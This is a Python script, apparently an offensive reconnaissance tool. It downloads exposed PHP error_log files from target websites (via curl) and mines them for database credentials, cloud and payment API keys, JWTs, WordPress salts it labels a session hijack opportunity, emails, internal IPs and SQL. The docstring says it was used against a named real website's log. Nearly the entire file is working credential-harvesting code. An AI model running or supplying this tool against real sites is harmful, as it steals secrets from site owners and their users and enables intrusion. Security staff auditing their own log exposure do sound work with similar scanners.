#!/usr/bin/env python3
"""Error log credential miner — extracts DB creds, API keys, SQL, emails, paths.
   Battle-tested on wines.com 1.7MB error_log (47 server paths, 879 SQL queries).
   Usage: python3 mine_error_log.py <error_log_file_or_url>"""

import sys, re, os, json
from collections import Counter

def mine_error_log(txt):
    """Extract intelligence from PHP error_log content."""
    results = {}

    # Server paths
    results['paths'] = sorted(set(re.findall(r'/home/[^\s:)]+', txt)))
    if not results['paths']:
        results['paths'] = sorted(set(re.findall(r'(?:/var/www|/usr/local|/opt)/[^\s:)]+', txt)))

    # Email addresses
    results['emails'] = sorted(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', txt)))

    # DB credentials (4 patterns from php error context)
    db_creds = set()
    for pat in [r"DB_USER[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_PASSWORD[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_HOST[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_NAME[^=]*=[\s'\"]*([^'\";\s]+)"]:
        for m in re.findall(pat, txt): db_creds.add(m)
    # Also catch function calls
    for pat in [r"mysql_connect\s*\([^)]*\)", r"mysqli_connect\s*\([^)]*\)",
                r"new\s+PDO\s*\([^)]*\)", r"pg_connect\s*\([^)]*\)"]:
        for m in re.findall(pat, txt, re.I): db_creds.add(m)
    results['db_creds'] = sorted(db_creds)

    # API keys (5 pattern classes)
    api_keys = set()
    for pat in [r'sk-[a-zA-Z0-9]{20,60}',            # Stripe secret
                r'AIza[0-9A-Za-z_-]{35}',             # Google API
                r'AKIA[0-9A-Z]{16}',                   # AWS IAM
                r'pk_[a-zA-Z0-9]+',                    # Publishable
                r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',  # JWT
                r'(?i)(?:api[_-]?key|access[_-]?token|auth[_-]?token|bearer)\s*[=:]\s*[\'"]([^\'"]{8,})[\'"]']:
        for m in re.findall(pat, txt):
            api_keys.add(str(m) if isinstance(m, str) else m[0] if isinstance(m, tuple) else m)
    results['api_keys'] = sorted(api_keys)[:15]

    # SQL queries
    results['sql_queries'] = re.findall(
        r'(?:SELECT|INSERT|UPDATE|DELETE|CREATE TABLE|ALTER TABLE|DROP TABLE)[^;]{0,300}', txt, re.I)

    # WordPress salts (session hijack potential)
    results['wp_salts'] = re.findall(
        r"(?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT|SECURE_AUTH_SALT|LOGGED_IN_SALT|NONCE_SALT)[^,;]+", txt)

    # PHP error breakdown
    results['error_types'] = Counter(re.findall(r'PHP\s+\w+:', txt)).most_common(10)

    # Stack traces
    results['stack_traces'] = len(re.findall(r'Stack trace:', txt))

    # Date range
    dates = re.findall(r'\[(\d{2}-\w{3}-\d{4})', txt)
    if dates:
        results['date_range'] = (dates[0], dates[-1], len(set(dates)))

    # Internal IPs
    results['internal_ips'] = sorted(set(
        re.findall(r'(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}', txt)))

    # Plugin paths from errors
    results['plugins'] = sorted(set(re.findall(r'/wp-content/plugins/([a-zA-Z0-9_-]+)/', txt)))
    results['themes'] = sorted(set(re.findall(r'/wp-content/themes/([a-zA-Z0-9_-]+)/', txt)))

    return results

def print_results(results):
    print("\n" + "="*60)
    print("ERROR LOG INTELLIGENCE REPORT")
    print("="*60)

    if results.get('date_range'):
        d = results['date_range']
        print(f"\n[Date Range] {d[0]} to {d[1]} ({d[2]} unique dates)")

    print(f"\n[Server Paths] {len(results.get('paths',[]))} paths:")
    for p in results.get('paths', [])[:15]: print(f"  {p}")

    print(f"\n[Email Addresses] {len(results.get('emails',[]))} found:")
    for e in results.get('emails', [])[:15]: print(f"  {e}")

    print(f"\n[DB Credentials] {len(results.get('db_creds',[]))} found:")
    for c in results.get('db_creds', []): print(f"  {c}")

    print(f"\n[API Keys/Tokens] {len(results.get('api_keys',[]))} found:")
    for k in results.get('api_keys', []): print(f"  {k[:80]}")

    print(f"\n[SQL Queries] {len(results.get('sql_queries',[]))} found:")
    for q in results.get('sql_queries', [])[:5]: print(f"  {q[:150]}")

    if results.get('wp_salts'):
        print(f"\n[WordPress Salts] {len(results['wp_salts'])} found — SESSION HIJACK POTENTIAL")

    print(f"\n[PHP Error Types]")
    for et, c in results.get('error_types', []): print(f"  {et}: {c}")
    print(f"  Stack traces: {results.get('stack_traces', 0)}")

    if results.get('internal_ips'):
        print(f"\n[Internal IPs] {len(results['internal_ips'])}:")
        for ip in results['internal_ips']: print(f"  {ip}")

    if results.get('plugins'):
        print(f"\n[Plugins from Errors] {len(results['plugins'])}:")
        for p in results['plugins']: print(f"  {p}")

    if results.get('themes'):
        print(f"\n[Themes from Errors] {len(results['themes'])}:")
        for t in results['themes']: print(f"  {t}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: mine_error_log.py <file>")
        print("       mine_error_log.py https://target.com/error_log (downloads first)")
        sys.exit(1)

    source = sys.argv[1]

    if source.startswith("http"):
        import subprocess
        print(f"[*] Downloading {source}...")
        r = subprocess.run(["curl", "-sk", "--max-time", "30", source], capture_output=True)
        txt = r.stdout.decode('utf-8', errors='replace')
    else:
        with open(source, 'r', errors='replace') as f:
            txt = f.read()

    print(f"[+] Loaded {len(txt)} bytes")
    results = mine_error_log(txt)
    print_results(results)

    # Save JSON
    outfile = source.replace('https://', '').replace('http://', '').replace('/', '_') + '_intel.json'
    with open(outfile, 'w') as f:
        json.dump({k: (list(v) if isinstance(v, set) else
                        [(et[0], et[1]) for et in v] if k == 'error_types' else v)
                   for k, v in results.items()}, f, indent=2, default=str)
    print(f"\n[+] JSON saved to {outfile}")
